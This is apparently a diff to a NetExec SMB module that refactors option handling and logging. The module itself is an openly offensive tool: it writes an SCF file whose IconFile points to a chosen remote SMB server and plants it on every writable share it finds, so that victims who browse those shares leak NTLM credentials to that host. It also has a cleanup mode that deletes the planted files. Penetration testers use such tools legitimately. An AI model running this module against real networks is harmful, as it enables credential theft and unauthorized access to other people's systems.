@@ -16,47 +16,31 @@ class NXCModule:
     supported_protocols = ["smb"]
     category = CATEGORY.PRIVILEGE_ESCALATION
 
+    @staticmethod
+    def register_module_options(subparsers):
+        subparsers.add_argument("--server-ip", help="IP of the remote SMB server", required=True)
+        subparsers.add_argument("--scf-filename", help="Name of the SCF file", required=True)
+        subparsers.add_argument("--cleanup", help="Clean the SCF file previously dropped", default=False, action="store_true")
+        return subparsers
+
     def __init__(self, context=None, module_options=None):
         self.context = context
         self.module_options = module_options
-        self.cleanup = None
-        self.server = None
-        self.file_path = None
-        self.scf_path = None
-        self.scf_name = None
-
-    def options(self, context, module_options):
-        """
-        SERVER      IP of the SMB server
-        NAME        SCF file name
-        CLEANUP     Cleanup (choices: True or False)
-        """
-        self.cleanup = False
-
-        if "CLEANUP" in module_options:
-            self.cleanup = bool(module_options["CLEANUP"])
-
-        if "NAME" not in module_options:
-            context.log.fail("NAME option is required!")
-            exit(1)
-
-        if not self.cleanup and "SERVER" not in module_options:
-            context.log.fail("SERVER option is required!")
-            exit(1)
-
-        self.scf_name = module_options["NAME"]
-        self.scf_path = f"{TMP_PATH}/{self.scf_name}.scf"
+        self.cleanup = module_options.cleanup
+        self.server = module_options.server_ip
+        self.scf_name = module_options.scf_filename
         self.file_path = ntpath.join("\\", f"{self.scf_name}.scf")
+        self.scf_path = f"{TMP_PATH}/{self.scf_name}.scf"
 
         if not self.cleanup:
-            self.server = module_options["SERVER"]
+            self.server = module_options.server_ip
 
             with open(self.scf_path, "a") as scuf:
                 scuf.write("[Shell]\n")
                 scuf.write("Command=2\n")
                 scuf.write(f"IconFile=\\\\{self.server}\\share\\icon.ico\n")
 
-    def on_login(self, context, connection):
+    def on_login(self, connection):
         shares = connection.shares()
         for share in shares:
             if "WRITE" in share["access"] and share["name"] not in [
@@ -64,17 +48,17 @@ class NXCModule:
                 "ADMIN$",
                 "NETLOGON",
             ]:
-                context.log.success(f"Found writable share: {share['name']}")
+                self.context.log.success(f"Found writable share: {share['name']}")
                 if not self.cleanup:
                     with open(self.scf_path, "rb") as scf:
                         try:
                             connection.conn.putFile(share["name"], self.file_path, scf.read)
-                            context.log.success(f"Created SCF file on the {share['name']} share")
+                            self.context.log.success(f"Created SCF file on the {share['name']} share")
                         except Exception as e:
-                            context.log.fail(f"Error writing SCF file to share {share['name']}: {e}")
+                            self.context.log.fail(f"Error writing SCF file to share {share['name']}: {e}")
                 else:
                     try:
                         connection.conn.deleteFile(share["name"], self.file_path)
-                        context.log.success(f"Deleted SCF file on the {share['name']} share")
+                        self.context.log.success(f"Deleted SCF file on the {share['name']} share")
                     except Exception as e:
-                        context.log.fail(f"Error deleting SCF file on share {share['name']}: {e}")
+                        self.context.log.fail(f"Error deleting SCF file on share {share['name']}: {e}")
